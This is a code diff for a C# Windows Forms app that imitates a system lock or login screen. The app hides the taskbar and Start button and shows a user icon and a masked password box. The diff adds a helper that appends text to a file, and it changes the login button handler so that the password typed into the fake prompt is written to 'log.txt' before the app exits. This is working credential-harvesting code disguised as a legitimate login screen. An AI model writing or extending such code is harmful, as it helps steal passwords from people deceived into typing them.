@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
@@ -8,11 +8,12 @@ using System.Linq;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
-using System.Linq;
 using System.Runtime.InteropServices;
-
+using System.Net;
+using System.IO;
 namespace WindowsFormsApp9
 {
+
     public partial class Form1 : Form
     {
         public Form1()
@@ -41,7 +42,6 @@ namespace WindowsFormsApp9
             pictureBox1.Top = usericonh;
             button1.Top = buttonh;
             label2.Top = usernameh;
-            label1.Top = locked;
             textBox2.UseSystemPasswordChar = true;
 
 
@@ -80,6 +80,7 @@ namespace WindowsFormsApp9
                 }
             }
 
+
             protected static int HandleOfStartButton
             {
                 get
@@ -106,6 +107,16 @@ namespace WindowsFormsApp9
                 ShowWindow(Handle, SW_HIDE);
                 ShowWindow(HandleOfStartButton, SW_HIDE);
             }
+        }
+
+
+        public void WriteForTxt(string path, string contentSrt)
+        {
+            FileStream fs = new FileStream(path, FileMode.Append);
+            StreamWriter wr = null;
+            wr = new StreamWriter(fs);
+            wr.WriteLine(contentSrt);
+            wr.Close();
         }
 
         public void WorkThreadFunction(Screen screen)
@@ -184,6 +195,7 @@ namespace WindowsFormsApp9
         private void textBox2_TextChanged(object sender, EventArgs e)
         {
             Console.WriteLine(textBox2);
+            
         }
 
         private void label1_Click(object sender, EventArgs e)
@@ -200,6 +212,8 @@ namespace WindowsFormsApp9
         private void button1_Click_1(object sender, EventArgs e)
         {
             Taskbar.Show();
+            string a = textBox2.Text;
+            WriteForTxt("log.txt", a);
             System.Windows.Forms.Application.Exit();
         }
     }
